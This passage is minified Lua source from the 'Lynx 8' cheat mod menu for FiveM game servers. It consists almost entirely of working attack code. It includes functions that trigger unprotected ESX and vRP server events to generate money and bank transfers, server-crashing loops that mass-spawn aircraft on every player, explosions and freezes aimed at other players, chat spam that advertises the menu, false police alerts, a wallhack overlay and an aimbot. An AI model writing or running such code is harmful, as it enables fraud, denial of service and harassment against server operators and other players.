local veh=CreateVehicle(GetHashKey(d4),b_.x+5*GetEntityForwardX(GetPlayerPed(-1)),b_.y+5*GetEntityForwardY(GetPlayerPed(-1)),b_.z+2.0,GetEntityHeading(GetPlayerPed(-1)),true,true)SetEntityAsNoLongerNeeded(veh)SetVehicleForwardSpeed(veh,150.0)end end end end

if DeleteGun then local d5=getEntity(PlayerId(-1))if IsPedInAnyVehicle(GetPlayerPed(-1),true)==false then au('~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!')GiveWeaponToPed(GetPlayerPed(-1),GetHashKey('WEAPON_PISTOL'),999999,false,true)SetPedAmmo(GetPlayerPed(-1),GetHashKey('WEAPON_PISTOL'),999999)if GetSelectedPedWeapon(GetPlayerPed(-1))==GetHashKey('WEAPON_PISTOL')then if IsPlayerFreeAiming(PlayerId(-1))then if IsEntityAPed(d5)then if IsPedInAnyVehicle(d5,true)then if IsControlJustReleased(1,142)then SetEntityAsMissionEntity(GetVehiclePedIsIn(d5,true),1,1)DeleteEntity(GetVehiclePedIsIn(d5,true))SetEntityAsMissionEntity(d5,1,1)DeleteEntity(d5)au('~g~Deleted!')end else if IsControlJustReleased(1,142)then SetEntityAsMissionEntity(d5,1,1)DeleteEntity(d5)au('~g~Deleted!')end end else if IsControlJustReleased(1,142)then SetEntityAsMissionEntity(d5,1,1)DeleteEntity(d5)au('~g~Deleted!')end end end end end end

if fuckallcars then for ax in EnumerateVehicles()do if not IsPedAPlayer(GetPedInVehicleSeat(ax,-1))then SetVehicleHasBeenOwnedByPlayer(ax,false)SetEntityAsMissionEntity(ax,false,false)StartVehicleAlarm(ax)DetachVehicleWindscreen(ax)SmashVehicleWindow(ax,0)SmashVehicleWindow(ax,1)SmashVehicleWindow(ax,2)SmashVehicleWindow(ax,3)SetVehicleTyreBurst(ax,0,true,1000.0)SetVehicleTyreBurst(ax,1,true,1000.0)SetVehicleTyreBurst(ax,2,true,1000.0)SetVehicleTyreBurst(ax,3,true,1000.0)SetVehicleTyreBurst(ax,4,true,1000.0)SetVehicleTyreBurst(ax,5,true,1000.0)SetVehicleTyreBurst(ax,4,true,1000.0)SetVehicleTyreBurst(ax,7,true,1000.0)SetVehicleDoorBroken(ax,0,true)SetVehicleDoorBroken(ax,1,true)SetVehicleDoorBroken(ax,2,true)SetVehicleDoorBroken(ax,3,true)SetVehicleDoorBroken(ax,4,true)SetVehicleDoorBroken(ax,5,true)SetVehicleDoorBroken(ax,6,true)SetVehicleDoorBroken(ax,7,true)SetVehicleLights(ax,1)Citizen.InvokeNative(0x1FD09E7390A74D54,ax,1)SetVehicleNumberPlateTextIndex(ax,5)SetVehicleNumberPlateText(ax,'LynxMenu')SetVehicleDirtLevel(ax,10.0)SetVehicleModColor_1(ax,1)SetVehicleModColor_2(ax,1)SetVehicleCustomPrimaryColour(ax,255,51,255)SetVehicleCustomSecondaryColour(ax,255,51,255)SetVehicleBurnout(ax,true)end end end

if destroyvehicles then for vehicle in EnumerateVehicles()do if vehicle~=GetVehiclePedIsIn(GetPlayerPed(-1),false)then NetworkRequestControlOfEntity(vehicle)SetVehicleUndriveable(vehicle,true)SetVehicleEngineHealth(vehicle,0)end end end

if explodevehicles then for vehicle in EnumerateVehicles()do if vehicle~=GetVehiclePedIsIn(GetPlayerPed(-1),false)then NetworkRequestControlOfEntity(vehicle)NetworkExplodeVehicle(vehicle,true,true,false)end end end

if huntspam then Citizen.Wait(1)TriggerServerEvent('esx-qalle-hunting:reward',20000)TriggerServerEvent('esx-qalle-hunting:sell')end

if deletenearestvehicle then for vehicle in EnumerateVehicles()do if vehicle~=GetVehiclePedIsIn(GetPlayerPed(-1),false)then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle,true),1,1)DeleteEntity(GetVehiclePedIsIn(vehicle,true))SetEntityAsMissionEntity(vehicle,1,1)DeleteEntity(vehicle)end end end

if freezeplayer then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))end

if freezeall then for i=0,128 do ClearPedTasksImmediately(GetPlayerPed(i))end end

if esp then for i=0,128 do if i~=PlayerId(-1)and GetPlayerServerId(i)~=0 then local a7=d(1.0)local d6=GetPlayerPed(i)local d7,d8,d9=table.unpack(GetEntityCoords(PlayerPedId(-1)))local x,y,z=table.unpack(GetEntityCoords(d6))local da='~h~Name: '..GetPlayerName(i)..'\nServer ID: '..GetPlayerServerId(i)..'\nPlayer ID: '..i..'\nDist: '..math.round(GetDistanceBetweenCoords(d7,d8,d9,x,y,z,true),1)if IsPedInAnyVehicle(d6,true)then local db=GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d6))))da=da..'\nVeh: '..db end

if espinfo and esp then DrawText3D(x,y,z-1.0,da,a7.r,a7.g,a7.b)end

if espbox and esp then LineOneBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,-0.9)LineOneEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,-0.9)LineTwoBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,-0.9)LineTwoEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,-0.9)LineThreeBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,-0.9)LineThreeEnd=GetOffsetFromEntityInWorldCoords(d6,-0.3,0.3,-0.9)LineFourBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,-0.9)TLineOneBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,0.8)TLineOneEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,0.8)TLineTwoBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,0.8)TLineTwoEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,0.8)TLineThreeBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,0.8)TLineThreeEnd=GetOffsetFromEntityInWorldCoords(d6,-0.3,0.3,0.8)TLineFourBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,0.8)ConnectorOneBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,0.3,0.8)ConnectorOneEnd=GetOffsetFromEntityInWorldCoords(d6,-0.3,0.3,-0.9)ConnectorTwoBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,0.8)ConnectorTwoEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,0.3,-0.9)ConnectorThreeBegin=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,0.8)ConnectorThreeEnd=GetOffsetFromEntityInWorldCoords(d6,-0.3,-0.3,-0.9)ConnectorFourBegin=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,0.8)ConnectorFourEnd=GetOffsetFromEntityInWorldCoords(d6,0.3,-0.3,-0.9)DrawLine(LineOneBegin.x,LineOneBegin.y,LineOneBegin.z,LineOneEnd.x,LineOneEnd.y,LineOneEnd.z,a7.r,a7.g,a7.b,255)DrawLine(LineTwoBegin.x,LineTwoBegin.y,LineTwoBegin.z,LineTwoEnd.x,LineTwoEnd.y,LineTwoEnd.z,a7.r,a7.g,a7.b,255)DrawLine(LineThreeBegin.x,LineThreeBegin.y,LineThreeBegin.z,LineThreeEnd.x,LineThreeEnd.y,LineThreeEnd.z,a7.r,a7.g,a7.b,255)DrawLine(LineThreeEnd.x,LineThreeEnd.y,LineThreeEnd.z,LineFourBegin.x,LineFourBegin.y,LineFourBegin.z,a7.r,a7.g,a7.b,255)DrawLine(TLineOneBegin.x,TLineOneBegin.y,TLineOneBegin.z,TLineOneEnd.x,TLineOneEnd.y,TLineOneEnd.z,a7.r,a7.g,a7.b,255)DrawLine(TLineTwoBegin.x,TLineTwoBegin.y,TLineTwoBegin.z,TLineTwoEnd.x,TLineTwoEnd.y,TLineTwoEnd.z,a7.r,a7.g,a7.b,255)DrawLine(TLineThreeBegin.x,TLineThreeBegin.y,TLineThreeBegin.z,TLineThreeEnd.x,TLineThreeEnd.y,TLineThreeEnd.z,a7.r,a7.g,a7.b,255)DrawLine(TLineThreeEnd.x,TLineThreeEnd.y,TLineThreeEnd.z,TLineFourBegin.x,TLineFourBegin.y,TLineFourBegin.z,a7.r,a7.g,a7.b,255)DrawLine(ConnectorOneBegin.x,ConnectorOneBegin.y,ConnectorOneBegin.z,ConnectorOneEnd.x,ConnectorOneEnd.y,ConnectorOneEnd.z,a7.r,a7.g,a7.b,255)DrawLine(ConnectorTwoBegin.x,ConnectorTwoBegin.y,ConnectorTwoBegin.z,ConnectorTwoEnd.x,ConnectorTwoEnd.y,ConnectorTwoEnd.z,a7.r,a7.g,a7.b,255)DrawLine(ConnectorThreeBegin.x,ConnectorThreeBegin.y,ConnectorThreeBegin.z,ConnectorThreeEnd.x,ConnectorThreeEnd.y,ConnectorThreeEnd.z,a7.r,a7.g,a7.b,255)DrawLine(ConnectorFourBegin.x,ConnectorFourBegin.y,ConnectorFourBegin.z,ConnectorFourEnd.x,ConnectorFourEnd.y,ConnectorFourEnd.z,a7.r,a7.g,a7.b,255)end

if esplines and esp then DrawLine(d7,d8,d9,x,y,z,a7.r,a7.g,a7.b,255)end end end end

if VehGod and IsPedInAnyVehicle(PlayerPedId(-1),true)then SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)),true)end

if oneshot then SetPlayerWeaponDamageModifier(PlayerId(-1),100.0)local dc=getEntity(PlayerId(-1))if IsEntityAPed(dc)then if IsPedInAnyVehicle(dc,true)then if IsPedInAnyVehicle(GetPlayerPed(-1),true)then if IsControlJustReleased(1,69)then NetworkExplodeVehicle(GetVehiclePedIsIn(dc,true),true,true,0)end else if IsControlJustReleased(1,142)then NetworkExplodeVehicle(GetVehiclePedIsIn(dc,true),true,true,0)end end end end else SetPlayerWeaponDamageModifier(PlayerId(-1),1.0)end

if rainbowf then for i=1,7 do Citizen.Wait(100)SetPedWeaponTintIndex(GetPlayerPed(-1),1198879012,i)i=i+1

if i==7 then i=1 end end end

if BlowDrugsUp then Citizen.CreateThread(function()TriggerServerEvent('esx_drugs:startHarvestWeed')TriggerServerEvent('esx_drugs:startHarvestCoke')TriggerServerEvent('esx_drugs:startHarvestMeth')TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startTransformWeed')TriggerServerEvent('esx_drugs:startTransformCoke')TriggerServerEvent('esx_drugs:startTransformMeth')TriggerServerEvent('esx_drugs:startTransformOpium')TriggerServerEvent('esx_drugs:startSellWeed')TriggerServerEvent('esx_drugs:startSellCoke')TriggerServerEvent('esx_drugs:startSellMeth')TriggerServerEvent('esx_drugs:startSellOpium')Citizen.Wait(1000)end)end

if blowall then for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'Lynx 8 ~ www.lynxmenu.com')end

for i=0,128 do Citizen.Wait(500)AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)end end

if crosshair then ShowHudComponentThisFrame(14)end

if crosshairc then by('~r~+',0.495,0.484)end

if crosshairc2 then by('~r~.',0.4968,0.478)end

if cM then local dd=false

local de=130

local df=0

for I=0,128 do if NetworkIsPlayerActive(I)and GetPlayerPed(I)~=GetPlayerPed(-1)then ped=GetPlayerPed(I)blip=GetBlipFromEntity(ped)x1,y1,z1=table.unpack(GetEntityCoords(GetPlayerPed(-1),true))x2,y2,z2=table.unpack(GetEntityCoords(GetPlayerPed(I),true))distance=math.floor(GetDistanceBetweenCoords(x1,y1,z1,x2,y2,z2,true))if dd then if NetworkIsPlayerTalking(I)then local dg=d(1.0)DrawText3D(x2,y2,z2+1.2,GetPlayerServerId(I)..'  |  '..GetPlayerName(I),dg.r,dg.g,dg.b)else DrawText3D(x2,y2,z2+1.2,GetPlayerServerId(I)..'  |  '..GetPlayerName(I),255,255,255)end end

if distance<de then if not dd then if NetworkIsPlayerTalking(I)then local dg=d(1.0)DrawText3D(x2,y2,z2+1.2,GetPlayerServerId(I)..'  |  '..GetPlayerName(I),dg.r,dg.g,dg.b)else DrawText3D(x2,y2,z2+1.2,GetPlayerServerId(I)..'  |  '..GetPlayerName(I),255,255,255)end end end end end end

if showCoords then x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(-1),true))roundx=tonumber(string.format('%.2f',x))roundy=tonumber(string.format('%.2f',y))roundz=tonumber(string.format('%.2f',z))by('~r~X:~s~ '..roundx,0.05,0.00)by('~r~Y:~s~ '..roundy,0.11,0.00)by('~r~Z:~s~ '..roundz,0.17,0.00)end

function carthieftroll()for i=0,128 do local bJ=GetEntityCoords(GetPlayerPed(i))TriggerServerEvent('esx_carthief:alertcops',bJ.x,bJ.y,bJ.z)end end

function automaticmoneyesx()local k=KeyboardInput('Warning, this value can be multiplied!!!','',100)if cN then if k~=''then local confirm=KeyboardInput('Are you sure? y/n','',0)if confirm=='y'then end

au('~h~~g~Testing all ~y~ESX ~g~scripts~s~.',true)TriggerServerEvent('esx_carthief:pay',k)TriggerServerEvent('esx_jobs:caution','give_back',k)TriggerServerEvent('esx_fueldelivery:pay',k)TriggerServerEvent('esx_carthief:pay',k)TriggerServerEvent('esx_godirtyjob:pay',k)TriggerServerEvent('esx_pizza:pay',k)TriggerServerEvent('esx_ranger:pay',k)TriggerServerEvent('esx_garbagejob:pay',k)TriggerServerEvent('esx_truckerjob:pay',k)TriggerServerEvent('AdminMenu:giveBank',k)TriggerServerEvent('AdminMenu:giveCash',k)TriggerServerEvent('esx_gopostaljob:pay',k)TriggerServerEvent('esx_banksecurity:pay',k)TriggerServerEvent('esx_slotmachine:sv:2',k)elseif confirm=='n'then au('~h~~b~Operation cancelled~s~.',false)else au('~h~~b~Invalid Confirmation~s~.',true)au('~h~~b~Operation cancelled~s~.',false)end end end

function vrpdestroy()for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'Lynx 8 ~ www.lynxmenu.com')end

TriggerServerEvent('lscustoms:payGarage',{costs=-99999999})TriggerServerEvent('vrp_slotmachine:server:2',999999999)TriggerServerEvent('Banca:deposit',999999999)TriggerServerEvent('bank:deposit',999999999)local dh=GetPlayerServerId(PlayerId())for i=0,128 do TriggerEvent('bank:transfer',dh,GetPlayerServerId(i),99999999)end end

if bu then esxdestroyv2()nukeserver()end

function esxdestroyv2()Citizen.CreateThread(function()TriggerServerEvent('esx_jobs:caution','give_back',9999999999)TriggerServerEvent('esx_fueldelivery:pay',9999999999)TriggerServerEvent('esx_carthief:pay',9999999999)TriggerServerEvent('esx_godirtyjob:pay',9999999999)TriggerServerEvent('esx_pizza:pay',9999999999)TriggerServerEvent('esx_ranger:pay',9999999999)TriggerServerEvent('esx_garbagejob:pay',9999999999)TriggerServerEvent('esx_truckerjob:pay',9999999999)TriggerServerEvent('AdminMenu:giveBank',9999999999)TriggerServerEvent('AdminMenu:giveCash',9999999999)TriggerServerEvent('esx_gopostaljob:pay',9999999999)TriggerServerEvent('esx_banksecurity:pay',9999999999)TriggerServerEvent('esx_slotmachine:sv:2',9999999999)for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'Lynx 8 ~ www.lynxmenu.com')end

for i=0,128 do TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(i),'item_money','money',1254756)TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(i),'item_money','money',1254756)TriggerServerEvent('esx_billing:sendBill',GetPlayerServerId(i),'Purposeless','Lynx 8 ~ www.lynxmenu.com',43161337)TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(i),'police',3)TriggerServerEvent('NB:recruterplayer',i,'police',3)end end)end

function giveeveryone()Citizen.CreateThread(function()TriggerServerEvent('esx_jobs:caution','give_back',9999999999)TriggerServerEvent('esx_fueldelivery:pay',9999999999)TriggerServerEvent('esx_carthief:pay',9999999999)TriggerServerEvent('esx_godirtyjob:pay',9999999999)TriggerServerEvent('esx_pizza:pay',9999999999)TriggerServerEvent('esx_ranger:pay',9999999999)TriggerServerEvent('esx_garbagejob:pay',9999999999)TriggerServerEvent('esx_truckerjob:pay',9999999999)TriggerServerEvent('AdminMenu:giveBank',9999999999)TriggerServerEvent('AdminMenu:giveCash',9999999999)TriggerServerEvent('esx_gopostaljob:pay',9999999999)TriggerServerEvent('esx_banksecurity:pay',9999999999)TriggerServerEvent('esx_slotmachine:sv:2',9999999999)for i=0,128 do TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(i),'item_money','money',125475600)TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(i),'item_money','money',125475600)end end)end

function nukeserver()Citizen.CreateThread(function()local di='Avenger'local dj='CARGOPLANE'local dk='luxor'local dl='maverick'local dm='blimp2'while not HasModelLoaded(GetHashKey(dj))do Citizen.Wait(0)RequestModel(GetHashKey(dj))end

while not HasModelLoaded(GetHashKey(dk))do Citizen.Wait(0)RequestModel(GetHashKey(dk))end

while not HasModelLoaded(GetHashKey(di))do Citizen.Wait(0)RequestModel(GetHashKey(di))end

while not HasModelLoaded(GetHashKey(dl))do Citizen.Wait(0)RequestModel(GetHashKey(dl))end

while not HasModelLoaded(GetHashKey(dm))do Citizen.Wait(0)RequestModel(GetHashKey(dm))end

for bC=0,9 do TriggerServerEvent('_chat:messageEntered','^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y',{141,211,255},'^'..bC..'Lynx 8 ~ www.lynxmenu.com')end

for i=0,128 do local dk=CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dl),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dl),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dl),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dm),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dm),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dm),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)end end)end

if servercrasherxd then Citizen.CreateThread(function()local di='Avenger'local dj='CARGOPLANE'local dk='luxor'local dl='maverick'local dm='blimp2'while not HasModelLoaded(GetHashKey(dj))do Citizen.Wait(0)RequestModel(GetHashKey(dj))end

while not HasModelLoaded(GetHashKey(dk))do Citizen.Wait(0)RequestModel(GetHashKey(dk))end

while not HasModelLoaded(GetHashKey(di))do Citizen.Wait(0)RequestModel(GetHashKey(di))end

while not HasModelLoaded(GetHashKey(dl))do Citizen.Wait(0)RequestModel(GetHashKey(dl))end

while not HasModelLoaded(GetHashKey(dm))do Citizen.Wait(0)RequestModel(GetHashKey(dm))end

for i=0,128 do for aj=100,150 do local dk=CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+aj,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+aj,true,true)and CreateVehicle(GetHashKey(dl),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dl),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dl),2*GetEntityCoords(GetPlayerPed(i))+aj,true,true)and CreateVehicle(GetHashKey(dm),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dm),GetEntityCoords(GetPlayerPed(i))-aj,true,true)and CreateVehicle(GetHashKey(dm),2*GetEntityCoords(GetPlayerPed(i))+aj,true,true)end end end)end

if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1),true)then if IsControlPressed(0,209)then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)),100.0)elseif IsControlPressed(0,210)then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)),0.0)end end

if TriggerBot then local dn,Entity=GetEntityPlayerIsFreeAimingAt(PlayerId(-1),Entity)if dn then if IsEntityAPed(Entity)and not IsPedDeadOrDying(Entity,0)and IsPedAPlayer(Entity)then ShootPlayer(Entity)end end end

DisplayRadar(true)if RainbowVeh then local dp=d(1.0)SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)),dp.r,dp.g,dp.b)SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)),dp.r,dp.g,dp.b)end

if rainbowh then for i=-1,12 do Citizen.Wait(100)local a7=d(1.0)SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)),i)SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)),a7.r,a7.g,a7.b)if i==12 then i=-1 end end end

if t2x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0*20.0)end

if t4x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0*20.0)end

if t10x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),10.0*20.0)end

if t16x then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0*20.0)end

if txd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),500.0*20.0)end

if tbxd then SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),9999.0*20.0)end

if Noclip then local dq=2

local dr=IsPedInAnyVehicle(PlayerPedId(-1),false)and GetVehiclePedIsUsing(PlayerPedId(-1))or PlayerPedId(-1)FreezeEntityPosition(PlayerPedId(-1),true)SetEntityInvincible(PlayerPedId(-1),true)local ds=GetEntityCoords(entity)DisableControlAction(0,32,true)DisableControlAction(0,268,true)DisableControlAction(0,31,true)DisableControlAction(0,269,true)DisableControlAction(0,33,true)DisableControlAction(0,266,true)DisableControlAction(0,34,true)DisableControlAction(0,30,true)DisableControlAction(0,267,true)DisableControlAction(0,35,true)DisableControlAction(0,44,true)DisableControlAction(0,20,true)local dt=0.0

local du=0.0

if GetInputMode()=='MouseAndKeyboard'then if IsDisabledControlPressed(0,32)then dt=0.5 end

if IsDisabledControlPressed(0,33)then dt=-0.5 end

if IsDisabledControlPressed(0,34)then SetEntityHeading(PlayerPedId(-1),GetEntityHeading(PlayerPedId(-1))+3.0)end

if IsDisabledControlPressed(0,35)then SetEntityHeading(PlayerPedId(-1),GetEntityHeading(PlayerPedId(-1))-3.0)end

if IsDisabledControlPressed(0,44)then du=0.21 end

if IsDisabledControlPressed(0,20)then du=-0.21 end end

ds=GetOffsetFromEntityInWorldCoords(dr,0.0,dt*(dq+0.3),du*(dq+0.3))local bK=GetEntityHeading(dr)SetEntityVelocity(dr,0.0,0.0,0.0)SetEntityRotation(dr,0.0,0.0,0.0,0,false)SetEntityHeading(dr,bK)SetEntityCollision(dr,false,false)SetEntityCoordsNoOffset(dr,ds.x,ds.y,ds.z,true,true,true)FreezeEntityPosition(dr,false)SetEntityInvincible(dr,false)SetEntityCollision(dr,true,true)end end end)Citizen.CreateThread(function()FreezeEntityPosition(entity,false)local dv=1

local dw=true

local dx=nil

local dy=nil

local dz=nil

local dA=1

local dB=1

local dC={1.0,2.0,4.0,10.0,512.0,9999.0}LynxEvo.CreateMenu('LynxX',br)LynxEvo.SetSubTitle('LynxX','34ByTe Community')LynxEvo.CreateSubMenu('SelfMenu','LynxX','Self Menu')LynxEvo.CreateSubMenu('TeleportMenu','LynxX','Teleport Menu')LynxEvo.CreateSubMenu('WeaponMenu','LynxX','Weapon Menu')LynxEvo.CreateSubMenu('AdvM','LynxX','Advanced Menu')LynxEvo.CreateSubMenu('LuaMenu','LynxX','Lua Menu')LynxEvo.CreateSubMenu('VehicleMenu','LynxX','Vehicle Menu')LynxEvo.CreateSubMenu('OnlinePlayerMenu','LynxX','Online Player Menu')LynxEvo.CreateSubMenu('PlayerOptionsMenu','OnlinePlayerMenu','Player Options')LynxEvo.CreateSubMenu('Destroyer','AdvM','Destroyer Menu')LynxEvo.CreateSubMenu('ESXBoss','LuaMenu','ESX Boss Triggers')LynxEvo.CreateSubMenu('ESXMoney','LuaMenu','ESX Money Triggers')LynxEvo.CreateSubMenu('ESXDrugs','LuaMenu','ESX Drugs')LynxEvo.CreateSubMenu('ESXCustom','LuaMenu','ESX Random Triggers')LynxEvo.CreateSubMenu('VRPTriggers','LuaMenu','VRP Triggers')LynxEvo.CreateSubMenu('MiscTriggers','LuaMenu','Misc Triggers')LynxEvo.CreateSubMenu('crds','LynxX','Credits')LynxEvo.CreateSubMenu('ESXJobs','LuaMenu','ESX Jobs')LynxEvo.CreateSubMenu('ESXJobs2','PlayerOptionsMenu','ESX Jobs Individual')LynxEvo.CreateSubMenu('ESXTriggerini','PlayerOptionsMenu','ESX Triggers')LynxEvo.CreateSubMenu('Trollmenu','PlayerOptionsMenu','Troll Menu')LynxEvo.CreateSubMenu('WeaponTypes','WeaponMenu','Weapons')LynxEvo.CreateSubMenu('WeaponTypeSelection','WeaponTypes','Weapon')LynxEvo.CreateSubMenu('WeaponOptions','WeaponTypeSelection','Weapon Options')LynxEvo.CreateSubMenu('ModSelect','WeaponOptions','Weapon Mod Options')LynxEvo.CreateSubMenu('CarTypes','VehicleMenu','Vehicles')LynxEvo.CreateSubMenu('CarTypeSelection','CarTypes','Moew :3')LynxEvo.CreateSubMenu('CarOptions','CarTypeSelection','Car Options')LynxEvo.CreateSubMenu('MainTrailer','VehicleMenu','Trailers to Attach')LynxEvo.CreateSubMenu('MainTrailerSel','MainTrailer','Trailers Available')LynxEvo.CreateSubMenu('MainTrailerSpa','MainTrailerSel','Trailer Options')LynxEvo.CreateSubMenu('GiveSingleWeaponPlayer','OnlinePlayerMenu','Single Weapon Menu')LynxEvo.CreateSubMenu('ESPMenu','AdvM','ESP Menu')LynxEvo.CreateSubMenu('LSC','VehicleMenu','LSC Customs')LynxEvo.CreateSubMenu('tunings','LSC','Visual Tuning')LynxEvo.CreateSubMenu('performance','LSC','Performance Tuning')LynxEvo.CreateSubMenu('VRPPlayerTriggers','PlayerOptionsMenu','VRP Triggers')LynxEvo.CreateSubMenu('BoostMenu','VehicleMenu','Vehicle Boost')LynxEvo.CreateSubMenu('SpawnPeds','Trollmenu','Spawn Peds')LynxEvo.CreateSubMenu('GCT','VehicleMenu','Global Car Trolls')LynxEvo.CreateSubMenu('CsMenu','AdvM','Crosshairs')for i,dD in pairs(bk)do LynxEvo.CreateSubMenu(dD.id,'tunings',dD.name)if dD.id=='paint'then LynxEvo.CreateSubMenu('primary',dD.id,'Primary Paint')LynxEvo.CreateSubMenu('secondary',dD.id,'Secondary Paint')LynxEvo.CreateSubMenu('rimpaint',dD.id,'Wheel Paint')LynxEvo.CreateSubMenu('classic1','primary','Classic Paint')LynxEvo.CreateSubMenu('metallic1','primary','Metallic Paint')LynxEvo.CreateSubMenu('matte1','primary','Matte Paint')LynxEvo.CreateSubMenu('metal1','primary','Metal Paint')LynxEvo.CreateSubMenu('classic2','secondary','Classic Paint')LynxEvo.CreateSubMenu('metallic2','secondary','Metallic Paint')LynxEvo.CreateSubMenu('matte2','secondary','Matte Paint')LynxEvo.CreateSubMenu('metal2','secondary','Metal Paint')LynxEvo.CreateSubMenu('classic3','rimpaint','Classic Paint')LynxEvo.CreateSubMenu('metallic3','rimpaint','Metallic Paint')LynxEvo.CreateSubMenu('matte3','rimpaint','Matte Paint')LynxEvo.CreateSubMenu('metal3','rimpaint','Metal Paint')end end

for i,dD in pairs(bl)do LynxEvo.CreateSubMenu(dD.id,'performance',dD.name)end

local SelectedPlayer

